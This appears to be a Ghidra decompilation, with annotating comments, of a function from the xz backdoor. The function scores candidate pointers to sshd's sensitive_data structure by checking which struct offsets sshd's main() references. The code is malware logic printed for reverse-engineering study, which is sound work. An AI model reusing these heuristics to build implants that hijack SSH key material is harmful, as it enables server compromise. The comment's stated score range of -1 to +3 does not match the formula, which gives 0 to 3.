// /home/kali/xzre-ghidra/xzregh/103910_sshd_get_sensitive_data_score_in_main.c
// Function: sshd_get_sensitive_data_score_in_main @ 0x103910
// Calling convention: __stdcall
// Prototype: int __stdcall sshd_get_sensitive_data_score_in_main(void * sensitive_data, elf_info_t * elf, string_references_t * refs)


/*
 * AutoDoc: Looks inside the cached `main()` range and searches for memory references to the struct at offsets 0, +8, and +0x10. It gives +1 when the base is accessed, +1 when +0x10 is touched, and subtracts one when +8 never shows up, producing a signed score between -1 and +3. The result is doubled later so the decision logic favours pointers that the main daemon manipulates frequently.
 */

#include "xzre_types.h"

int sshd_get_sensitive_data_score_in_main
              (void *sensitive_data,elf_info_t *elf,string_references_t *refs)

{
  u8 *code_start;
  u8 *code_end;
  BOOL base_hit;
  BOOL offset10_hit;
  BOOL offset8_hit;
  int score;
  u8 *main_end;
  u8 *main_start;
  
  score = 0;
  // AutoDoc: Reuse the `list_hostkey_types` string reference to bound sshd’s `main()` implementation before scanning.
  code_start = (u8 *)(refs->list_hostkey_types).func_start;
  if (code_start != (u8 *)0x0) {
    code_end = (u8 *)(refs->list_hostkey_types).func_end;
    // AutoDoc: Award the first point when any instruction in `main()` touches the candidate struct base.
    base_hit = find_instruction_with_mem_operand(code_start,code_end,(dasm_ctx_t *)0x0,sensitive_data);
    // AutoDoc: Look for a second access at offset +0x10; most true positives tick that bookkeeping field at least once.
    offset10_hit = find_instruction_with_mem_operand
                      (code_start,code_end,(dasm_ctx_t *)0x0,(void *)((long)sensitive_data + 0x10));
    // AutoDoc: Track whether the +8 slot ever gets referenced so we can penalise pointers that never resemble the real layout.
    offset8_hit = find_instruction_with_mem_operand
                      (code_start,code_end,(dasm_ctx_t *)0x0,(void *)((long)sensitive_data + 8));
    // AutoDoc: Collapse the three booleans into the signed -1…+3 score that later feeds the aggregate heuristic.
    score = (((uint)(base_hit != FALSE) - (uint)(offset10_hit == FALSE)) + 2) - (uint)(offset8_hit == FALSE);
  }
  return score;
}

